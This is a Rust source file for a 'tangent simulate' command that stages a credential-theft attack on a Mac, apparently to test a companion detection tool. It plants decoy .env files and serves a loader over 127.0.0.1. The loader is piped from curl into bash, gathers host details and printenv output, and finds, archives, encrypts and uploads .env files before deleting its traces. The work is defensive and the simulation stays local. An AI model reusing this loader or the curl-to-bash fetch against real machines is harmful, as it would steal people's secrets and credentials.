//! `tangent simulate`: one attack, run for real on this Mac while
//! `tangent watch mac` is watching, so its owner sees an alert and a review
//! without waiting for a real one.
//!
//! It is the credential sweep of the LiteLLM and Contagious Interview
//! incidents, with everything it touches made here first: a loader piped
//! from curl into bash asks the machine who it is, collects the `.env`
//! files of a project, archives and encrypts them, and posts them to its
//! server. The project is a directory made for this run, its `.env` files
//! hold made-up keys, and the server is this process, on 127.0.0.1, which
//! keeps nothing it is sent. No file of the owner's is opened, nothing
//! leaves the Mac, and the directory is removed at the end.

use std::io::{BufRead as _, BufReader, Read as _, Write as _};
use std::net::{TcpListener, TcpStream};
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::Duration;

use anyhow::{bail, Context, Result};

/// The projects the sweep finds, and the file of made-up keys in each.
const DECOYS: &[(&str, &str)] = &[
    (
        "acme-chat/.env",
        "OPENAI_API_KEY=made-up-for-tangent-simulate\nDATABASE_URL=postgres://acme:made-up@db.acme.example/chat\n",
    ),
    (
        "acme-api/.env.production",
        "AWS_ACCESS_KEY_ID=made-up-for-tangent-simulate\nAWS_SECRET_ACCESS_KEY=made-up-for-tangent-simulate\nSTRIPE_SECRET_KEY=made-up-for-tangent-simulate\n",
    ),
];

/// What curl pipes into bash. `ROOT` is the directory swept and `SERVER`
/// where the haul goes: both are this run's own.
const LOADER: &str = r#"d=$(mktemp -d)
(hostname; whoami; uname -a; printenv) > "$d/host" 2>/dev/null
find "ROOT" -name '.env*' -type f 2>/dev/null > "$d/found"
tar -czf "$d/bundle.tar.gz" -T "$d/found" "$d/host" 2>/dev/null
openssl rand -hex 32 > "$d/key"
openssl enc -aes-256-cbc -pbkdf2 -pass "file:$d/key" -in "$d/bundle.tar.gz" -out "$d/bundle.enc"
curl -s -o /dev/null -X POST "SERVER/upload" -H 'Content-Type: application/octet-stream' --data-binary "@$d/bundle.enc"
rm -rf "$d"
"#;

/// Answers one request: the loader for a GET, and for anything else its
/// body is read to the end and dropped.
fn answer(stream: TcpStream, loader: &str) -> std::io::Result<()> {
    stream.set_read_timeout(Some(Duration::from_secs(10)))?;
    let mut reader = BufReader::new(stream);
    let mut first = String::new();
    reader.read_line(&mut first)?;
    let mut length = 0usize;
    loop {
        let mut line = String::new();
        if reader.read_line(&mut line)? == 0 || line.trim().is_empty() {
            break;
        }
        if let Some((name, value)) = line.split_once(':') {
            if name.eq_ignore_ascii_case("content-length") {
                length = value.trim().parse().unwrap_or(0);
            }
        }
    }
    std::io::copy(
        &mut reader.by_ref().take(length as u64),
        &mut std::io::sink(),
    )?;
    let body = if first.starts_with("GET ") {
        loader
    } else {
        ""
    };
    let mut stream = reader.into_inner();
    write!(
        stream,
        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    )
}

/// Runs the attack in `root`, a directory made for it, and returns how
/// many requests its server took: the loader's fetch and the upload.
fn attack(root: &Path) -> Result<usize> {
    for (file, text) in DECOYS {
        let path = root.join(file);
        std::fs::create_dir_all(path.parent().context("a decoy has a directory")?)?;
        std::fs::write(&path, text)?;
    }
    let listener = TcpListener::bind("127.0.0.1:0").context("opening the stand-in server")?;
    let server = format!("http://127.0.0.1:{}", listener.local_addr()?.port());
    let loader = LOADER
        .replace("ROOT", &root.to_string_lossy())
        .replace("SERVER", &server);
    let (done, taken) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            if answer(stream, &loader).is_ok() && done.send(()).is_err() {
                break;
            }
        }
    });
    let status = Command::new("/bin/sh")
        .arg("-c")
        .arg(format!("curl -fsSL {server}/install.sh | bash"))
        .current_dir(root.join("acme-chat"))
        .stdin(Stdio::null())
        .status()
        .context("starting the loader")?;
    if !status.success() {
        bail!("the loader ended with {status}");
    }
    Ok(taken.try_iter().count())
}

/// The steps of the attack, as they are said: what ran and what it was for.
fn steps(root: &Path) -> String {
    let root = root.display();
    format!(
        "  1. A project is made, with two files of made-up keys:\n\
         \x20      {root}/acme-chat/.env\n\
         \x20      {root}/acme-api/.env.production\n\
         \x20 2. A script is fetched and run the way a poisoned package or a pasted install line does:\n\
         \x20      curl -fsSL http://127.0.0.1:<port>/install.sh | bash\n\
         \x20 3. The script asks what machine it is on:\n\
         \x20      hostname; whoami; uname -a; printenv\n\
         \x20 4. It finds the keys, packs them and encrypts them:\n\
         \x20      find {root} -name '.env*'\n\
         \x20      tar -czf bundle.tar.gz ...; openssl enc -aes-256-cbc ...\n\
         \x20 5. It uploads them and removes its traces:\n\
         \x20      curl -X POST http://127.0.0.1:<port>/upload --data-binary @bundle.enc; rm -rf ...\n\
         \n\
         The server on 127.0.0.1 is this command, which keeps nothing. No file of yours is opened\n\
         and nothing leaves this Mac."
    )
}

/// `tangent simulate`.
pub fn run() -> Result<()> {
    if !cfg!(target_os = "macos") {
        bail!("tangent simulate is the attack `tangent watch mac` is shown catching, and this is not a Mac");
    }
    let root = tempfile::Builder::new()
        .prefix("acme-")
        .tempdir()
        .context("making the project it sweeps")?;
    println!(
        "tangent simulate: a credential theft, run for real on this Mac and safe to run.\n\n{}",
        steps(root.path())
    );
    let requests = attack(root.path())?;
    if requests < 2 {
        bail!("the attack did not finish: its server took {requests} of 2 requests");
    }
    drop(root);
    println!(
        "\nAll five steps ran, and the project is removed.\n\
         `tangent watch mac` says what it makes of it in its own terminal: flagged within a minute\n\
         or two, and reviewed about seven minutes after that."
    );
    Ok(())
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;

    /// The attack runs to its end in a directory of its own: the loader is
    /// fetched from its server and the haul posted back to it, and what it
    /// swept is the files made for it.
    #[test]
    fn the_attack_sweeps_its_own_files_to_its_own_server() {
        let root = tempfile::tempdir().unwrap();
        assert_eq!(attack(root.path()).unwrap(), 2, "a fetch and an upload");
        for (file, text) in DECOYS {
            assert_eq!(
                &std::fs::read_to_string(root.path().join(file)).unwrap(),
                text
            );
        }
    }

    /// The server gives the loader to a GET and nothing to an upload, whose
    /// body it reads to the end.
    #[test]
    fn the_server_gives_the_loader_and_keeps_nothing() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        std::thread::spawn(move || {
            for stream in listener.incoming().flatten() {
                let _ = answer(stream, "echo loader\n");
            }
        });
        let ask = |request: &str| {
            let mut stream = TcpStream::connect(addr).unwrap();
            stream.write_all(request.as_bytes()).unwrap();
            let mut reply = String::new();
            stream.read_to_string(&mut reply).unwrap();
            reply
        };
        assert!(ask("GET /install.sh HTTP/1.1\r\n\r\n").ends_with("\r\n\r\necho loader\n"));
        let posted = ask("POST /upload HTTP/1.1\r\nContent-Length: 4\r\n\r\nhaul");
        assert!(
            posted.ends_with("Content-Length: 0\r\nConnection: close\r\n\r\n"),
            "{posted}"
        );
    }
}
